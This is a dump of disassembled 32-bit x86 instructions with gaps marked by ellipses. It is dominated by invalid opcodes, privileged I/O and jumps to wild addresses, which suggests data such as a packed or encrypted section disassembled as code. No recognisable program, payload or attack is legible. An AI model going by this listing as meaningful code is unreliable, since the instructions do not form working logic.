  41de6d:	or     DWORD PTR [edx+0x1e],esi
  41de70:	sub    cl,BYTE PTR [ebp-0x64]
  41de73:	pop    ecx
  41de74:	fwait
  41de75:	xchg   edx,eax
  41de76:	inc    dl
  41de78:	es fs and ah,ah
  41de7c:	cwde   
  41de7d:	jecxz  0x41de93
  41de7f:	in     al,dx
  41de80:	(bad)  
  41de81:	xor    edx,DWORD PTR [edi-0x375c440c]
  41de87:	lds    edi,FWORD PTR [ecx+0x35]
  41de8a:	test   eax,0xb33a6651
  41de8f:	cmc    
  41de90:	outs   dx,BYTE PTR ds:[esi]
  41de91:	daa    
  41de92:	mov    esp,0x77ff470b
  41de97:	in     eax,dx
  41de98:	clc    
  41de99:	and    eax,0x8af70568
  41de9e:	xlat   BYTE PTR ds:[ebx]
  41de9f:	pop    ecx
  41dea0:	out    0x98,eax
  41dea2:	jbe    0x41dea8
  41dea4:	mov    DWORD PTR [edx+0x6d],ebx
  41dea7:	mov    dl,al
  41dea9:	dec    DWORD PTR [edx]
  41deab:	push   esi
  41deac:	mov    dh,0x42
  41deae:	(bad)  
  41deaf:	push   esi
  41deb0:	dec    edi
  41deb1:	cmc    
  41deb2:	fcmovne st,st(1)
  41deb4:	jecxz  0x41dea9
  41deb6:	push   ebp
  41deb7:	pop    esp
  41deb8:	or     bh,BYTE PTR [ecx-0x7ba72bc0]
  41debe:	(bad)  
  41debf:	icebp  
  41dec0:	adc    bl,BYTE PTR ds:0x232672aa
  41dec6:	scas   al,BYTE PTR es:[edi]
  41dec7:	bound  edi,QWORD PTR [ebp-0x5e]
  41deca:	mov    dl,0xbe
  41decc:	add    cl,BYTE PTR [edx+0x68]
  41decf:	add    ch,BYTE PTR [eax+esi*1-0x516bc07e]
  41ded6:	jne    0x41deeb
  41ded8:	cmc    
  41ded9:	cmp    DWORD PTR [esi+edi*4+0x4],ecx
  41dedd:	enter  0x45d8,0xf3
  41dee1:	add    BYTE PTR [edi*1+0x8f0ddae],0xe1
  41dee9:	fwait
  41deea:	mov    dh,0x71
  41deec:	and    eax,0xa890ae14
  41def1:	adc    dh,bh
  41def3:	jge    0x41deed
  41def5:	neg    DWORD PTR [ebp+0x6e]
  41def8:	pop    ecx
  41def9:	lods   al,BYTE PTR ds:[si]
  41defb:	cmp    dh,bh
  41defd:	in     al,dx
  41defe:	push   eax
  41deff:	sbb    al,0x36
  41df01:	shl    BYTE PTR [edx+0xbb51403],0xd9
  41df08:	mov    ah,0xa4
  41df0a:	xchg   edx,eax
  41df0b:	dec    edx
  41df0c:	push   ds
  41df0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df0e:	sub    al,0xaa
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x4ecf9ce9
  41df82:	stc    
  41df83:	dec    ecx
  41df84:	mov    BYTE PTR [esi],bh
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	mov    dh,0xe5
  41df8e:	jg     0x41df39
  41df90:	mov    DWORD PTR [esi],esi
  41df92:	out    dx,al
  41df93:	pusha  
  41df94:	push   edi
  41df95:	scas   eax,DWORD PTR es:[edi]
  41df96:	cli    
  41df97:	inc    esp
  41df98:	mov    esi,0x763d0c7b
  41df9d:	mov    bl,0xe8
  41df9f:	cmp    eax,0x1ed9ff64
  41dfa4:	jo     0x41dff6
  41dfa6:	sub    DWORD PTR [edi+0x2b],ebx
  41dfa9:	xchg   edx,eax
  41dfaa:	(bad)  
  41dfab:	fisubr DWORD PTR [ebp-0x23]
  41dfae:	popf   
  41dfaf:	mov    ds:0xe5f36aee,al
  41dfb4:	inc    ecx
  41dfb5:	pop    esi
  41dfb6:	stos   DWORD PTR es:[edi],eax
  41dfb7:	push   edx
  41dfb8:	or     eax,0xef2f5a7b
  41dfbd:	mov    bh,0x9d
  41dfbf:	sbb    ecx,DWORD PTR [ecx]
  41dfc1:	scas   eax,DWORD PTR es:[edi]
  41dfc2:	push   ebp
  41dfc3:	xchg   ecx,eax
  41dfc4:	sub    eax,0xc3432542
  41dfc9:	jb     0x41dfe8
  41dfcb:	je     0x41dffb
  41dfcd:	js     0x41e041
  41dfcf:	js     0x41df57
  41dfd1:	or     BYTE PTR [eax],dh
  41dfd3:	mov    edx,DWORD PTR [edi]
  41dfd5:	loop   0x41e030
  41dfd7:	call   0x8e1c4d70
  41dfdc:	aad    0x82
  41dfde:	pop    edx
  41dfdf:	jae    0x41e00c
  41dfe1:	loopne 0x41e023
  41dfe3:	or     eax,0xae2c5b6c
  41dfe8:	xchg   esp,eax
  41dfe9:	(bad)  
  41dfea:	cmp    al,0xb5
  41dfec:	adc    eax,0x8505f3a6
  41dff1:	(bad)  
  41dff2:	pop    eax
  41dff3:	mov    WORD PTR [ecx+0x43],?
  41dff6:	mov    ecx,0x5c39c7e0
  41dffb:	jmp    0x41e00a
  41dffd:	sbb    eax,0x1463f5b6
  41e002:	jl     0x41dfd6
  41e004:	pop    edx
  41e005:	and    ebp,DWORD PTR [ebx+edi*4]
  41e008:	ds loop 0x41dfc1
  41e00b:	or     eax,0x61dc1435
  41e010:	xor    eax,DWORD PTR [edx+edx*4]
  41e013:	shl    BYTE PTR [ecx+0x1b],0x17
  41e017:	sti    
  41e018:	xchg   ebx,eax
  41e019:	inc    ebp
  41e01a:	xchg   ecx,eax
  41e01b:	dec    ebx
  41e01c:	mov    dh,0x82
  41e01e:	and    DWORD PTR [edi],ebp
  41e020:	mov    eax,0x4e152cbb
  41e025:	mov    eax,DWORD PTR [eax]
  41e027:	retf   0x88c5
  41e02a:	xchg   esp,eax
  41e02b:	xchg   DWORD PTR [ebx],ecx
  41e02d:	push   esp
  41e02e:	lock out dx,al
  41e030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e031:	ror    eax,0x2a
  41e034:	push   ds
  41e035:	xchg   edi,eax
  41e036:	jmp    0x592c1281
  41e03b:	stos   BYTE PTR es:[edi],al
  41e03c:	inc    ebp
  41e03d:	mov    ebx,fs
  41e03f:	test   eax,0xe0e7f908
  41e044:	push   edi
  41e045:	pop    esp
  41e046:	jecxz  0x41e025
  41e048:	imul   ecx,DWORD PTR [esi],0x54
  41e04b:	mov    ebx,0xd42ab454
  41e050:	inc    edx
  41e051:	test   al,0x58
  41e053:	fild   WORD PTR [esi+0x1c]
  41e056:	cmp    BYTE PTR [edi+0x26a09079],ah
  41e05c:	dec    edx
  41e05d:	call   0x7cd2fe74
  41e062:	les    eax,FWORD PTR [ecx+0xf77edef]
  41e068:	mov    bl,0xe5
  41e06a:	test   BYTE PTR [eax],dh
  41e06c:	sbb    edi,ebp
  41e06e:	xor    BYTE PTR [esi-0x60a2323b],bh
  41e074:	jl     0x41e0cd
  41e076:	out    dx,eax
  41e077:	cdq    
  41e078:	mov    dl,0x28
  41e07a:	outs   dx,DWORD PTR ds:[esi]
  41e07b:	push   ebx
  41e07c:	add    edi,DWORD PTR [eax]
  41e07e:	sbb    al,0x49
  41e080:	dec    eax
  41e081:	sub    BYTE PTR [esi],cl
  41e083:	xchg   ebp,eax
  41e084:	mov    al,ds:0xc37750f4
  41e089:	retf   
  41e08a:	and    eax,0x11d6aa48
  41e08f:	push   ecx
	...
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	mov    ch,0xa2
  41e102:	pop    es
  41e103:	dec    BYTE PTR [edi+edi*1+0x1040001]
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	(bad)  
  41e10e:	std    
  41e10f:	ret    
  41e110:	scas   al,BYTE PTR es:[edi]
  41e111:	retf   0x4076
  41e114:	inc    esp
  41e115:	cmp    esi,DWORD PTR [ebx*2+0x6a4f851e]
  41e11c:	xor    eax,0x497e8c33
  41e121:	ret    0xac00
  41e124:	mov    BYTE PTR [ecx-0x44],cl
  41e127:	js     0x41e176
  41e129:	push   0x61
  41e12b:	add    ebx,0x31
  41e12e:	add    dh,BYTE PTR ds:0xd99c1918
  41e134:	sbb    eax,ebx
  41e136:	ror    BYTE PTR [esi+0x53152ec0],1
  41e13c:	daa    
  41e13d:	(bad)  
  41e13e:	mov    BYTE PTR [ebp+0x7a],dl
  41e141:	addr16 mov ch,0x55
  41e144:	mov    ecx,0x5c35faa7
  41e149:	stc    
  41e14a:	sti    
  41e14b:	loop   0x41e1b7
  41e14d:	(bad)  
  41e14e:	mov    ch,0x52
  41e150:	ret    
  41e151:	xlat   BYTE PTR ds:[ebx]
  41e152:	or     BYTE PTR [edi-0xb],0x1e
  41e156:	adc    edx,esi
  41e158:	push   eax
  41e159:	in     eax,0xca
  41e15b:	fiadd  DWORD PTR [edx-0x69]
  41e15e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e15f:	sub    al,0xbd
  41e161:	sbb    al,0xac
  41e163:	mov    ah,dl
  41e165:	js     0x41e133
  41e167:	sbb    esp,eax
  41e169:	adc    BYTE PTR [ebx-0x651657df],0xb1
  41e170:	(bad)  
  41e171:	push   0xc747d179
  41e176:	sub    edi,DWORD PTR [eax+0x5c20832c]
  41e17c:	adc    edx,ebp
  41e17e:	add    BYTE PTR [ecx+0x69],bh
  41e181:	sub    al,0x56
  41e183:	in     eax,0x7
  41e185:	adc    bl,BYTE PTR gs:[edx+0x30fd9bb]
  41e18c:	or     DWORD PTR [esi+0x5c0aae56],ebx
  41e192:	ror    BYTE PTR [ecx-0x5],1
  41e195:	add    eax,esp
  41e197:	pop    ecx
  41e198:	cli    
  41e199:	shr    eax,1
  41e19b:	jle    0x41e168
  41e19d:	arpl   WORD PTR ds:0x79c54a22,cx
  41e1a3:	jns    0x41e14c
  41e1a5:	sbb    eax,0x19555579
  41e1aa:	aaa    
  41e1ab:	imul   esp,DWORD PTR [edi],0xffffff8d
  41e1ae:	jp     0x41e1bd
  41e1b0:	jl     0x41e20c
  41e1b2:	add    al,BYTE PTR [esi]
  41e1b4:	fidiv  WORD PTR es:[esi]
  41e1b7:	gs das 
  41e1b9:	jge    0x41e22d
  41e1bb:	cwde   
  41e1bc:	sar    ah,1
  41e1be:	sbb    edi,eax
  41e1c0:	leave  
  41e1c1:	stc    
  41e1c2:	lock bnd jg 0x41e22f
  41e1c6:	cs loopne 0x41e23e
  41e1c9:	mov    BYTE PTR [ebx+0x31],cl
  41e1cc:	das    
  41e1cd:	cdq    
  41e1ce:	aad    0x2
  41e1d0:	das    
  41e1d1:	mul    DWORD PTR [edi]
  41e1d3:	dec    eax
  41e1d4:	ins    DWORD PTR es:[edi],dx
  41e1d5:	jne    0x41e1e2
  41e1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d8:	gs cmp al,0xb
  41e1db:	(bad)  
  41e1dc:	push   cs
  41e1dd:	pop    ebx
  41e1de:	outs   dx,DWORD PTR ds:[esi]
  41e1df:	cmp    edx,eax
  41e1e1:	push   eax
  41e1e2:	inc    esp
  41e1e3:	adc    BYTE PTR ds:0xe7820f5c,ch
  41e1ea:	pop    ss
  41e1eb:	in     al,0x3e
  41e1ed:	inc    esp
  41e1ee:	dec    ecx
  41e1ef:	mov    edx,0x8c5ea6ed
  41e1f4:	(bad)  [esi+0x47cb9744]
  41e1fa:	inc    ebx
  41e1fb:	xor    BYTE PTR [edx-0xd7d970d],dl
  41e201:	dec    edx
  41e202:	add    esi,edx
  41e204:	add    al,0x52
  41e206:	ror    ebx,cl
  41e208:	dec    esi
  41e209:	pop    ebp
  41e20a:	fimul  DWORD PTR [edi]
  41e20c:	fwait
  41e20d:	pusha  
  41e20e:	dec    eax
  41e20f:	push   ebx
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0xb6
  41e281:	outs   dx,DWORD PTR ds:[esi]
  41e282:	sbb    cl,ch
  41e284:	nop
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	hlt    
  41e28d:	or     DWORD PTR [ecx-0x517fd69c],esi
  41e293:	pop    esi
  41e294:	mov    ecx,0xbb51d7c7
  41e299:	bound  esp,QWORD PTR [eax-0x1468524e]
  41e29f:	in     eax,dx
  41e2a0:	push   edi
  41e2a1:	retf   0xd77f
  41e2a4:	adc    BYTE PTR [ecx],0xfa
  41e2a7:	dec    esi
  41e2a8:	mov    WORD PTR [edx+0x3032f2a2],gs
  41e2ae:	sbb    eax,0x1478df58
  41e2b3:	hlt    
  41e2b4:	push   0xffffff86
  41e2b6:	addr16 xchg esi,eax
  41e2b8:	jnp    0x41e2f4
  41e2ba:	mov    al,ds:0xdfedb449
  41e2bf:	imul   ebp,DWORD PTR [esi+0x64],0x51bde90e
  41e2c6:	aad    0x5c
  41e2c8:	cmp    al,0x75
  41e2ca:	xor    eax,0xfa6ecbef
  41e2cf:	(bad)  
  41e2d0:	cld    
  41e2d1:	xchg   edi,eax
  41e2d2:	aaa    
  41e2d3:	sub    al,BYTE PTR [edx-0x23]
  41e2d6:	push   ds
  41e2d7:	sub    cl,BYTE PTR [edx+ebx*4]
  41e2da:	pop    edx
  41e2db:	cli    
  41e2dc:	jnp    0x41e34e
  41e2de:	pusha  
  41e2df:	push   esp
  41e2e0:	repz and esi,DWORD PTR [ebp-0x21]
  41e2e4:	push   ss
  41e2e5:	pop    ecx
  41e2e6:	or     al,0x4
  41e2e8:	lds    esp,FWORD PTR [eax-0x73]
  41e2eb:	addr16 mov ebp,0x5f32603
  41e2f1:	lods   eax,DWORD PTR ds:[esi]
  41e2f2:	fdiv   QWORD PTR ds:0x744588cd
  41e2f8:	repnz and DWORD PTR [edx-0x401f9f54],ecx
  41e2ff:	pop    ss
  41e300:	mov    ch,0x29
  41e302:	xor    al,0x9a
  41e304:	cmp    al,0xa5
  41e306:	or     eax,DWORD PTR [edi+0x18f77b43]
  41e30c:	out    dx,al
  41e30d:	sbb    DWORD PTR [ebx-0x1545e982],ebp
  41e313:	cwde   
  41e314:	mov    dl,0xb2
  41e316:	retf   0x63b4
  41e319:	dec    eax
  41e31a:	out    0xb4,al
  41e31c:	xchg   esp,eax
  41e31d:	push   edx
  41e31e:	test   eax,0x914e5af9
  41e323:	jb     0x41e39e
  41e325:	jmp    FWORD PTR [ebx-0x685d9869]
  41e32b:	and    ecx,esi
  41e32d:	push   eax
  41e32e:	cmc    
  41e32f:	aam    0xce
  41e331:	aas    
  41e332:	mov    edx,0xa351f462
  41e337:	xchg   esp,eax
  41e338:	push   es
  41e339:	push   es
  41e33a:	imul   ebx,DWORD PTR [ecx-0x36],0xf48bd49
  41e341:	inc    ecx
  41e343:	retf   
  41e344:	jmp    0x41e2d3
  41e346:	popa   
  41e347:	cdq    
  41e348:	sbb    al,0x41
  41e34a:	std    
  41e34b:	xchg   esp,eax
  41e34c:	bound  ebx,QWORD PTR [ebx+0x7a6ac71b]
  41e352:	ins    DWORD PTR es:[edi],dx
  41e353:	sub    edx,DWORD PTR [ebp+0x3fb23586]
  41e359:	lds    ebx,FWORD PTR [edi+ecx*2]
  41e35c:	jo     0x41e317
  41e35e:	data16 fist DWORD PTR [edi]
  41e361:	sub    DWORD PTR [eax-0x51],eax
  41e364:	into   
  41e365:	in     eax,0x6f
  41e367:	mov    ebx,0x24a82f8c
  41e36c:	sub    bh,BYTE PTR [eax]
  41e36e:	cmp    BYTE PTR [edi+eax*1-0x5897b52f],al
  41e375:	sub    dl,BYTE PTR [ecx+0x32b932a3]
  41e37b:	mov    WORD PTR [ebx],ds
  41e37d:	cwde   
  41e37e:	addr16 adc al,0x89
  41e381:	(bad)  
  41e382:	sahf   
  41e383:	popa   
  41e384:	(bad)  
  41e385:	call   0xa1f11409
  41e38a:	pop    esi
  41e38b:	imul   ebp,DWORD PTR [eax+0x1d6748],0x0
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xc825a909
  41e403:	mov    cl,0x94
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	aam    0x7c
  41e40e:	push   0xf3b7ec9e
  41e413:	jmp    0x951d65e9
  41e418:	add    al,0x9e
  41e41a:	test   DWORD PTR [edi+0x41],0xe51de15e
  41e421:	inc    esi
  41e422:	adc    dl,BYTE PTR [esi+0x75af6d51]
  41e428:	mov    ds:0x3be4fd12,eax
  41e42d:	mov    eax,ds:0x1e687ea8
  41e432:	ins    DWORD PTR es:[edi],dx
  41e433:	push   cs
  41e434:	sbb    bl,BYTE PTR [ebx]
  41e436:	and    al,0x93
  41e438:	pop    esi
  41e439:	in     al,dx
  41e43a:	data16 cmp BYTE PTR [ecx],0x2c
  41e43e:	jmp    FWORD PTR [ebx]
  41e440:	je     0x41e41d
  41e442:	enter  0x2ab,0x0
  41e446:	cmp    BYTE PTR [edx-0x62],ah
  41e449:	dec    esi
  41e44a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e44b:	das    
  41e44c:	into   
  41e44d:	lods   eax,DWORD PTR ds:[esi]
  41e44e:	das    
  41e44f:	sar    BYTE PTR [edi-0x5c],cl
  41e452:	out    dx,al
  41e453:	lahf   
  41e454:	xor    esp,ebx
  41e456:	into   
  41e457:	cld    
  41e458:	jae    0x41e448
  41e45a:	retf   
  41e45b:	sub    al,0x53
  41e45d:	add    eax,ebp
  41e45f:	mov    dh,cl
  41e461:	adc    bh,0xe7
  41e464:	jne    0x41e3f6
  41e466:	inc    edi
  41e467:	aam    0x63
  41e469:	xchg   ebx,eax
  41e46a:	test   eax,0xcc743863
  41e46f:	ds jbe 0x41e4db
  41e472:	or     al,0x99
  41e474:	gs iret 
  41e476:	in     eax,0x6c
  41e478:	xchg   edx,eax
  41e479:	mov    ds:0x9f23d0b1,eax
  41e47e:	pop    ecx
  41e47f:	sub    al,0x84
  41e481:	sub    BYTE PTR [edx+ecx*4],cl
  41e484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e486:	cmp    DWORD PTR [esi-0x1d315cce],esi
  41e48c:	add    edi,DWORD PTR [esi+ebp*8+0x2156a21a]
  41e493:	arpl   WORD PTR [ebp-0x4ee29684],si
  41e499:	mov    ch,dl
  41e49b:	jg     0x41e4c9
  41e49d:	(bad)  [ecx+0x51ab9d17]
  41e4a3:	and    esi,DWORD PTR [esi+0x5063876]
  41e4a9:	retf   
  41e4aa:	jg     0x41e508
  41e4ac:	bndldx (bad),[esi+ebx*8]
  41e4b0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e4b2:	push   eax
  41e4b3:	jo     0x41e517
  41e4b5:	cmc    
  41e4b6:	shl    BYTE PTR [eax+ecx*1-0x12f146d1],cl
  41e4bd:	jno    0x41e510
  41e4bf:	mov    ebp,0xbb82c04b
  41e4c4:	(bad)  
  41e4c5:	std    
  41e4c6:	test   eax,0x425a0dc7
  41e4cb:	xchg   edx,ebx
  41e4cd:	dec    edx
  41e4ce:	xchg   ebp,eax
  41e4cf:	pop    eax
  41e4d0:	ss xchg ecx,eax
  41e4d2:	scas   eax,DWORD PTR es:[edi]
  41e4d3:	pushf  
  41e4d4:	jmp    0x78f1c5b8
  41e4d9:	rol    ah,1
  41e4db:	(bad)  
  41e4dc:	and    dl,bh
  41e4de:	add    eax,0xeaedab5d
  41e4e3:	lock das 
  41e4e5:	and    ebx,DWORD PTR [ecx+0x5edaf305]
  41e4eb:	mov    al,ds:0xf51db214
  41e4f0:	sub    BYTE PTR [eax+0x65fbc77e],dl
  41e4f6:	aad    0x51
  41e4f8:	ins    DWORD PTR es:[edi],dx
  41e4f9:	out    dx,eax
  41e4fa:	(bad)  
  41e4fc:	push   ss
  41e4fd:	pop    eax
  41e4fe:	fst    QWORD PTR [esi+0x5df09446]
  41e504:	xchg   DWORD PTR [esi],ebp
  41e506:	pop    esp
  41e507:	aaa    
  41e508:	jecxz  0x41e4e0
  41e50a:	retf   0x53b7
  41e50d:	adc    al,0x78
  41e50f:	inc    edx
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e59f
  41e581:	loope  0x41e5b8
  41e583:	outs   dx,DWORD PTR ds:[esi]
  41e584:	cwde   
  41e585:	inc    edx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    al,0x1
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	leave  
  41e58d:	out    0x98,al
  41e58f:	jge    0x41e56e
  41e591:	clc    
  41e592:	out    dx,eax
  41e593:	lock mov ah,dh
  41e596:	aam    0x8f
  41e598:	pusha  
  41e599:	out    0x80,al
  41e59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e59c:	sub    bl,BYTE PTR [ebx+0x2f]
  41e59f:	and    DWORD PTR [ecx-0x4e],ecx
  41e5a2:	ja     0x41e53a
  41e5a4:	in     eax,dx
  41e5a5:	popf   
  41e5a6:	mov    ebx,0xcfe581ec
  41e5ab:	fadd   st,st(6)
  41e5ad:	bound  ebx,QWORD PTR [edi-0x4f]
  41e5b0:	or     al,BYTE PTR [ebp+0x49]
  41e5b3:	push   esi
  41e5b4:	sub    al,0x37
  41e5b6:	fistp  QWORD PTR [ebx-0x4a8cefaa]
  41e5bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5bd:	scas   eax,DWORD PTR es:[edi]
  41e5be:	push   eax
  41e5bf:	xchg   esi,eax
  41e5c0:	and    al,0x14
  41e5c2:	sbb    BYTE PTR [eax-0x7a],ah
  41e5c5:	adc    bh,bh
  41e5c7:	gs cmp dl,ah
  41e5ca:	mov    ds:0x569dcc45,al
  41e5cf:	mov    ch,0xf8
  41e5d1:	adc    BYTE PTR [ebp+0x78],cl
  41e5d4:	sbb    DWORD PTR [esi-0x51],0x47
  41e5d8:	xor    eax,0x2536ee57
  41e5dd:	stc    
  41e5de:	ret    0xfd9
  41e5e1:	inc    ebp
  41e5e2:	in     eax,dx
  41e5e3:	mov    ds:0x4a2aef8b,al
  41e5e8:	jecxz  0x41e61c
  41e5ea:	ds adc eax,esi
  41e5ed:	(bad)  
  41e5ee:	jcxz   0x41e623
  41e5f1:	outs   dx,BYTE PTR ds:[esi]
  41e5f2:	ror    bl,cl
  41e5f4:	(bad)  [ebp+0x5beb1aa9]
  41e5fa:	mov    dl,0x17
  41e5fc:	dec    esp
  41e5fd:	mov    ecx,0x1eae6938
  41e602:	xchg   esp,eax
  41e603:	sbb    dl,ah
  41e605:	mov    ebx,DWORD PTR [edi+0x36c3c86e]
  41e60b:	push   ebx
  41e60c:	pop    esi
  41e60d:	jmp    0x6ac9:0xa1bc6d93
  41e614:	cmp    ch,bh
  41e616:	mov    al,ds:0xe52a6f34
  41e61b:	pop    ebp
  41e61c:	mov    dh,0x59
  41e61e:	xor    BYTE PTR [ebp+0x1b3e257],ah
  41e624:	das    
  41e625:	push   esi
  41e626:	aad    0x54
  41e628:	mov    edi,0x787b8aee
  41e62d:	adc    DWORD PTR [eax+edi*1],ebp
  41e630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e631:	cli    
  41e632:	or     ebp,DWORD PTR [edi]
  41e634:	lock ficomp DWORD PTR [ebx]
  41e637:	dec    ecx
  41e638:	int3   
  41e639:	mov    esi,0x995fc04f
  41e63e:	cs push es
  41e640:	inc    esi
  41e641:	adc    al,0xcc
  41e643:	(bad)  
  41e644:	stc    
  41e645:	stos   DWORD PTR es:[edi],eax
  41e646:	in     al,dx
  41e647:	pop    ebp
  41e648:	mov    al,0x45
  41e64a:	sbb    eax,0x6d1630d5
  41e64f:	push   ds
  41e650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e651:	call   0xaba15c1
  41e656:	out    0xa2,al
  41e658:	or     al,0x1c
  41e65a:	push   ds
  41e65b:	sub    DWORD PTR [edi-0x362a4f8a],0x5beb6ba4
  41e665:	rcl    cl,cl
  41e667:	adc    DWORD PTR [ecx],edi
  41e669:	fdivr  QWORD PTR [ebp+ebp*4-0x1]
  41e66d:	cmp    eax,0xf42c5ed9
  41e672:	cmp    dl,ch
  41e674:	push   ecx
  41e675:	shl    DWORD PTR [edx-0x28],0xc9
  41e679:	loope  0x41e636
  41e67b:	mov    bl,0x85
  41e67d:	pop    edi
  41e67e:	fwait
  41e67f:	in     al,0xa
  41e681:	mov    edi,DWORD PTR [edx]
  41e683:	cmp    bh,BYTE PTR [ebp+ebx*4+0x4872294b]
  41e68a:	mov    WORD PTR [ecx-0x47094042],ss
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebx,DWORD PTR [ecx]
  41e701:	hlt    
  41e702:	pop    es
  41e703:	pop    esp
  41e704:	pushf  
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	jle    0x41e703
  41e70e:	adc    ch,dh
  41e710:	xchg   DWORD PTR [ecx+0x23491e4b],esi
  41e716:	push   0x2d
  41e718:	adc    BYTE PTR [ebp-0x3f],dl
  41e71b:	popa   
  41e71c:	lds    edx,FWORD PTR [edi-0x5b]
  41e71f:	push   ss
  41e720:	jge    0x41e706
  41e722:	pop    esp
  41e723:	add    al,0xa
  41e725:	stos   DWORD PTR es:[edi],eax
  41e726:	pushf  
  41e727:	and    al,0x1e
  41e729:	sbb    ah,dh
  41e72b:	addr16 or al,0xf2
  41e72e:	jecxz  0x41e79a
  41e730:	sbb    DWORD PTR [edx-0x567ecb],edx
  41e736:	add    BYTE PTR [esi+0x1d],al
  41e739:	mov    esp,0x87a93d10
  41e73e:	add    edx,eax
  41e740:	je     0x41e6e5
  41e742:	std    
  41e743:	and    edi,0xfffffff5
  41e746:	jns    0x41e73c
  41e748:	pop    ecx
  41e749:	push   eax
  41e74a:	iret   
  41e74b:	out    0xd2,al
  41e74d:	xlat   BYTE PTR ds:[ebx]
  41e74e:	mov    cl,0x83
  41e750:	and    BYTE PTR [ebp-0x2e],ch
  41e753:	loope  0x41e795
  41e755:	push   esp
  41e756:	in     eax,0xd2
  41e758:	mov    cl,0xf2
  41e75a:	sahf   
  41e75b:	ins    DWORD PTR es:[edi],dx
  41e75c:	fldl2e 
  41e75e:	test   DWORD PTR [edx],eax
  41e760:	jg     0x41e7d8
  41e762:	mov    bh,0x8d
  41e764:	sub    bh,BYTE PTR [eax]
  41e766:	pusha  
  41e767:	dec    edx
  41e768:	out    0x4b,al
  41e76a:	lds    edi,FWORD PTR [ebx+0x6b]
  41e76d:	inc    esi
  41e76e:	mov    dh,0xb3
  41e770:	test   BYTE PTR [eax],al
  41e772:	mov    eax,0x3958feb8
  41e777:	aas    
  41e778:	mov    ds:0x73e8c724,al
  41e77d:	out    0x2d,al
  41e77f:	inc    ecx
  41e780:	xor    eax,0x84af8688
  41e785:	js     0x41e746
  41e787:	add    BYTE PTR [ecx-0xd],0xc2
  41e78b:	pop    ebp
  41e78c:	push   cs
  41e78d:	inc    ebp
  41e78e:	into   
  41e78f:	dec    eax
  41e790:	mov    edx,0xaef7ed6d
  41e795:	gs ss jmp 0x41e7ce
  41e799:	cmp    DWORD PTR ds:0xc43ec71a,0xffffffbc
  41e7a0:	dec    edx
  41e7a1:	shr    DWORD PTR [ebx+0xbd96664],1
  41e7a7:	out    dx,eax
  41e7a8:	sti    
  41e7a9:	mov    ds:0xb716a624,eax
  41e7ae:	mov    ch,0x2b
  41e7b0:	fmul   QWORD PTR [ebx]
  41e7b2:	and    eax,0xfe3d481b
  41e7b7:	dec    esp
  41e7b8:	enter  0xc340,0xa7
  41e7bc:	das    
  41e7bd:	out    dx,al
  41e7be:	std    
  41e7bf:	add    DWORD PTR [ebp-0x3e],0x5954f490
  41e7c6:	das    
  41e7c7:	jno    0x41e770
  41e7c9:	sbb    edx,DWORD PTR es:[edx+0x78ae253a]
  41e7d0:	jns    0x41e7a9
  41e7d2:	pusha  
  41e7d3:	push   es
  41e7d4:	repnz xlat BYTE PTR ss:[ebx]
  41e7d7:	dec    esp
  41e7d8:	cli    
  41e7d9:	mov    ds:0xd65d7cde,al
  41e7de:	xor    DWORD PTR ds:0x189be05c,ecx
  41e7e4:	dec    edx
  41e7e5:	jg     0x41e80e
  41e7e7:	daa    
  41e7e8:	xchg   esp,eax
  41e7e9:	xor    eax,DWORD PTR [ecx]
  41e7eb:	adc    BYTE PTR [ecx-0x7901f6d5],cl
  41e7f1:	add    BYTE PTR [ebp+0x3],0xbc
  41e7f5:	leave  
  41e7f6:	lods   eax,DWORD PTR ds:[esi]
  41e7f7:	push   ecx
  41e7f8:	inc    esp
  41e7f9:	and    BYTE PTR [ecx+esi*2],0x3d
  41e7fd:	push   0x6d
  41e7ff:	mov    ds:0x30746362,eax
  41e804:	shl    BYTE PTR [esi],1
  41e806:	add    ah,bh
